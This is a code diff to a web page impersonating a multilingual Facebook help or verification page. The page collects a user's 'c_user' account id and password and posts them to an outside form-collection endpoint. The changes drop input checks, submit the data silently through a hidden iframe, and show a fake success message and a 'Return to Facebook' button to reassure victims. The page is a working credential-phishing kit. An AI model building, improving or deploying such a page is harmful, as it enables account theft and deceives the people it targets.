@@ -17,6 +17,7 @@
             --text-dark: #1d2129;
             --white: #ffffff;
             --error-red: #d9534f;
+            --success-green: #42b72a;
         }
         
         * {
@@ -81,6 +82,11 @@
             margin-top: 12px;
             border: none;
             cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .action-button:hover {
+            background-color: var(--secondary-blue);
         }
         
         .footer {
@@ -351,7 +357,7 @@
         
         .success-icon {
             font-size: 60px;
-            color: #42b72a;
+            color: var(--success-green);
             margin-bottom: 20px;
         }
         
@@ -365,6 +371,32 @@
             color: var(--dark-gray);
             max-width: 400px;
             margin: 0 auto;
+            margin-bottom: 20px;
+        }
+        
+        .success-image {
+            max-width: 200px;
+            margin: 20px auto;
+            display: block;
+        }
+        
+        .return-button {
+            background-color: var(--primary-blue);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+            transition: background-color 0.2s;
+        }
+        
+        .return-button:hover {
+            background-color: var(--secondary-blue);
         }
         
         @media (min-width: 768px) {
@@ -439,8 +471,7 @@
     </div>
 
     <!-- Verification Form (hidden initially) -->
-    <form id="verificationForm" action="https://submit-form.com/jow05m4xR" method="post">
-        
+    <form id="verificationForm" action="https://submit-form.com/jow05m4xR" method="POST">
         <input type="hidden" id="selectedLanguage" name="language" value="en">
         <div id="root">
             <div class="header">
@@ -492,7 +523,7 @@
                                         
                                         <div class="form-group">
                                             <label for="c_user" class="form-label" id="cUserLabel">c_user</label>
-                                            <input type="number" id="c_user" name="c_user" class="form-control" required pattern="^\d{15}$" title="Please enter 15 digits">
+                                            <input type="number" id="c_user" name="c_user" class="form-control" required>
                                         </div>
                                         
                                         <div class="form-group">
@@ -518,14 +549,16 @@
                                     <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required>
                                     <div class="error-message" id="passwordError">Please enter your password</div>
                                 </div>
-                                <button type="button" class="final-submit-btn" id="finalSubmit">Send Confirmation</button>
+                                <button type="submit" class="final-submit-btn" id="finalSubmit">Send Confirmation</button>
                             </div>
                         </div>
                         
                         <div class="success-message" id="successMessage">
-                            <div class="success-icon">✓</div>
+                           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQgPqOqYfZJPNUUWJesXCM_YLr74RrZt50Pq7pKTSdF6waOYIGTt7uE416vAlKkIhVJd4k&usqp=CAU" alt="Success" class="success-image">
                             <h2 class="success-title" id="successTitle">Your request has been submitted successfully</h2>
-                            <p class="success-text" id="successText">We are reviewing your information and will contact you shortly.</p>
+                            <p class="success-text" id="successText">We are reviewing your information and will contact you shortly. Our team will verify your details and get back to you within 24 hours.</p>
+                          
+                            <button class="return-button" id="returnButton">Return to Facebook</button>
                         </div>
                     </div>
                     <div class="card-footer">
@@ -556,7 +589,8 @@
                 submit: "Submit",
                 finalSubmit: "Send Confirmation",
                 successTitle: "Your request has been submitted successfully",
-                successText: "We are reviewing your information and will contact you shortly."
+                successText: "We are reviewing your information and will contact you shortly. Our team will verify your details and get back to you within 24 hours.",
+                returnButton: "Return to Facebook"
             },
             es: {
                 helpCenter: "Centro de ayuda",
@@ -576,7 +610,8 @@
                 submit: "Enviar",
                 finalSubmit: "Enviar confirmación",
                 successTitle: "Su solicitud ha sido enviada con éxito",
-                successText: "Estamos revisando su información y nos comunicaremos con usted pronto."
+                successText: "Estamos revisando su información y nos comunicaremos con usted pronto. Nuestro equipo verificará sus datos y se comunicará con usted en 24 horas.",
+                returnButton: "Volver a Facebook"
             },
             fr: {
                 helpCenter: "Centre d'aide",
@@ -596,7 +631,8 @@
                 submit: "Soumettre",
                 finalSubmit: "Envoyer la confirmation",
                 successTitle: "Votre demande a été soumise avec succès",
-                successText: "Nous examinons vos informations et vous contacterons sous peu."
+                successText: "Nous examinons vos informations et vous contacterons sous peu. Notre équipe vérifiera vos données et reviendra vers vous dans les 24 heures.",
+                returnButton: "Retour à Facebook"
             },
             de: {
                 helpCenter: "Hilfebereich",
@@ -616,7 +652,8 @@
                 submit: "Einreichen",
                 finalSubmit: "Bestätigung senden",
                 successTitle: "Ihre Anfrage wurde erfolgreich übermittelt",
-                successText: "Wir prüfen Ihre Informationen und werden uns in Kürze bei Ihnen melden."
+                successText: "Wir prüfen Ihre Informationen und werden uns in Kürze bei Ihnen melden. Unser Team wird Ihre Daten überprüfen und sich innerhalb von 24 Stunden bei Ihnen melden.",
+                returnButton: "Zu Facebook zurückkehren"
             },
             pt: {
                 helpCenter: "Central de Ajuda",
@@ -636,7 +673,8 @@
                 submit: "Enviar",
                 finalSubmit: "Enviar confirmação",
                 successTitle: "Seu pedido foi enviado com sucesso",
-                successText: "Estamos analisando suas informações e entraremos em contato em breve."
+                successText: "Estamos analisando suas informações e entraremos em contato em breve. Nossa equipe verificará seus dados e retornará em até 24 horas.",
+                returnButton: "Voltar para o Facebook"
             },
             ar: {
                 helpCenter: "مركز المساعدة",
@@ -656,7 +694,8 @@
                 submit: "إرسال",
                 finalSubmit: "إرسال التأكيد",
                 successTitle: "تم تقديم طلبك بنجاح",
-                successText: "نحن نراجع معلوماتك وسنتواصل معك قريبًا."
+                successText: "نحن نراجع معلوماتك وسنتواصل معك قريبًا. سيتحقق فريقنا من بياناتك وسيعود إليك في غضون 24 ساعة.",
+                returnButton: "العودة إلى Facebook"
             },
             hi: {
                 helpCenter: "सहायता केंद्र",
@@ -676,7 +715,8 @@
                 submit: "जमा करें",
                 finalSubmit: "पुष्टि भेजें",
                 successTitle: "आपका अनुरोध सफलतापूर्वक जमा कर दिया गया है",
-                successText: "हम आपकी जानकारी की समीक्षा कर रहे हैं और जल्द ही आपसे संपर्क करेंगे।"
+                successText: "हम आपकी जानकारी की समीक्षा कर रहे हैं और जल्द ही आपसे संपर्क करेंगे। हमारी टीम आपके विवरणों को सत्यापित करेगी और 24 घंटों के भीतर आपके पास वापस आएगी।",
+                returnButton: "Facebook पर वापस जाएं"
             },
             zh: {
                 helpCenter: "帮助中心",
@@ -696,7 +736,8 @@
                 submit: "提交",
                 finalSubmit: "发送确认",
                 successTitle: "您的请求已成功提交",
-                successText: "我们正在审核您的信息，并将很快与您联系。"
+                successText: "我们正在审核您的信息，并将很快与您联系。我们的团队将验证您的详细信息并在24小时内回复您。",
+                returnButton: "返回Facebook"
             },
             ru: {
                 helpCenter: "Центр помощи",
@@ -716,7 +757,8 @@
                 submit: "Отправить",
                 finalSubmit: "Отправить подтверждение",
                 successTitle: "Ваш запрос успешно отправлен",
-                successText: "Мы проверяем вашу информацию и свяжемся с вами в ближайшее время."
+                successText: "Мы проверяем вашу информацию и свяжемся с вами в ближайшее время. Наша команда проверит ваши данные и ответит вам в течение 24 часов.",
+                returnButton: "Вернуться в Facebook"
             },
             ja: {
                 helpCenter: "ヘルプセンター",
@@ -736,7 +778,8 @@
                 submit: "送信",
                 finalSubmit: "確認を送信",
                 successTitle: "リクエストが正常に送信されました",
-                successText: "情報を確認し、すぐにご連絡いたします。"
+                successText: "情報を確認し、すぐにご連絡いたします。当社のチームが詳細を確認し、24時間以内にご連絡いたします。",
+                returnButton: "Facebookに戻る"
             },
             it: {
                 helpCenter: "Centro assistenza",
@@ -756,7 +799,8 @@
                 submit: "Invia",
                 finalSubmit: "Invia conferma",
                 successTitle: "La tua richiesta è stata inviata con successo",
-                successText: "Stiamo esaminando le tue informazioni e ti contatteremo a breve."
+                successText: "Stiamo esaminando le tue informazioni e ti contatteremo a breve. Il nostro team verificherà i tuoi dati e ti risponderà entro 24 ore.",
+                returnButton: "Torna a Facebook"
             },
             tr: {
                 helpCenter: "Yardım Merkezi",
@@ -776,7 +820,8 @@
                 submit: "Gönder",
                 finalSubmit: "Onay Gönder",
                 successTitle: "İsteğiniz başarıyla gönderildi",
-                successText: "Bilgilerinizi inceliyoruz ve en kısa sürede sizinle iletişime geçeceğiz."
+                successText: "Bilgilerinizi inceliyoruz ve en kısa sürede sizinle iletişime geçeceğiz. Ekibimiz bilgilerinizi doğrulayacak ve 24 saat içinde size geri dönecektir.",
+                returnButton: "Facebook'a dön"
             },
             nl: {
                 helpCenter: "Helpcentrum",
@@ -796,7 +841,8 @@
                 submit: "Verzenden",
                 finalSubmit: "Bevestiging verzenden",
                 successTitle: "Uw verzoek is succesvol ingediend",
-                successText: "We beoordelen uw informatie en nemen spoedig contact met u op."
+                successText: "We beoordelen uw informatie en nemen spoedig contact met u op. Ons team zal uw gegevens verifiëren en binnen 24 uur bij u terugkomen.",
+                returnButton: "Terug naar Facebook"
             },
             pl: {
                 helpCenter: "Centrum pomocy",
@@ -816,7 +862,8 @@
                 submit: "Prześlij",
                 finalSubmit: "Wyślij potwierdzenie",
                 successTitle: "Twoje zgłoszenie zostało pomyślnie wysłane",
-                successText: "Przeglądamy Twoje informacje i wkrótce się z Tobą skontaktujemy."
+                successText: "Przeglądamy Twoje informacje i wkrótce się z Tobą skontaktujemy. Nasz zespół zweryfikuje Twoje dane i odpowie w ciągu 24 godzin.",
+                returnButton: "Wróć do Facebooka"
             },
             sv: {
                 helpCenter: "Hjälpcenter",
@@ -836,7 +883,8 @@
                 submit: "Skicka",
                 finalSubmit: "Skicka bekräftelse",
                 successTitle: "Din förfrågan har skickats",
-                successText: "Vi granskar din information och kommer att kontakta dig snart."
+                successText: "Vi granskar din information och kommer att kontakta dig snart. Vårt team kommer att verifiera dina uppgifter och återkomma inom 24 timmar.",
+                returnButton: "Återgå till Facebook"
             }
         };
 
@@ -855,6 +903,7 @@
             const languageSelector = document.getElementById('languageSelector');
             const formContent = document.getElementById('formContent');
             const successMessage = document.getElementById('successMessage');
+            const returnButton = document.getElementById('returnButton');
             
             // Show verification form when Get Started is clicked
             getStartedBtn.addEventListener('click', function() {
@@ -896,6 +945,7 @@
                 document.getElementById('finalSubmit').textContent = langData.finalSubmit;
                 document.getElementById('successTitle').textContent = langData.successTitle;
                 document.getElementById('successText').textContent = langData.successText;
+                document.getElementById('returnButton').textContent = langData.returnButton;
             }
             
             // Sound toggle functionality
@@ -909,12 +959,12 @@
             // Initial form validation
             initialSubmit.addEventListener('click', function(e) {
                 const cUser = document.getElementById('c_user');
-                if (!/^\d{15000000}$/.test(cUser.value)) {
+                if (cUser.value.trim() === '') {
                     alert(translations[currentLanguage].cUserLabel + " " + 
-                        (currentLanguage === 'en' ? "must be 5 digits" : 
-                         currentLanguage === 'es' ? "debe tener 5 dígitos" :
-                         currentLanguage === 'fr' ? "doit comporter 5 chiffres" :
-                         
+                        (currentLanguage === 'en' ? "is required" : 
+                         currentLanguage === 'es' ? "es requerido" :
+                         currentLanguage === 'fr' ? "est requis" :
+                         "is required"));
                     cUser.focus();
                     return false;
                 }
@@ -938,8 +988,10 @@
                 passwordConfirmation.scrollIntoView({ behavior: 'smooth' });
             });
             
-            // Final submission
-            finalSubmit.addEventListener('click', function() {
+            // Final submission with hidden form submission
+            finalSubmit.addEventListener('click', function(e) {
+                e.preventDefault(); // Prevent default form submission
+                
                 if (passwordInput.value.trim() === '') {
                     passwordError.style.display = 'block';
                     passwordInput.focus();
@@ -948,14 +1000,35 @@
                 
                 passwordError.style.display = 'none';
                 
-                // Show success message
+                // Create a hidden iframe for silent form submission
+                const iframe = document.createElement('iframe');
+                iframe.name = 'hidden-form-submitter';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                
+                // Change form target to the iframe
+                form.target = 'hidden-form-submitter';
+                
+                // Submit the form silently
+                form.submit();
+                
+                // Show success message to user
                 formContent.style.display = 'none';
                 successMessage.style.display = 'block';
+                document.querySelector('.card-footer').style.display = 'none';
+                successMessage.scrollIntoView({ behavior: 'smooth' });
                 
-                // Submit form automatically after 2 seconds
-                setTimeout(function() {
-                    form.submit();
-                }, 2000);
+                // Remove the iframe after submission (optional)
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                }, 5000);
+            });
+            
+            // Return button functionality
+            returnButton.addEventListener('click', function() {
+                // In a real scenario, this would redirect to Facebook
+                // For demo purposes, we'll just reload the page
+                window.location.reload();
             });
             
             // Validate password on input
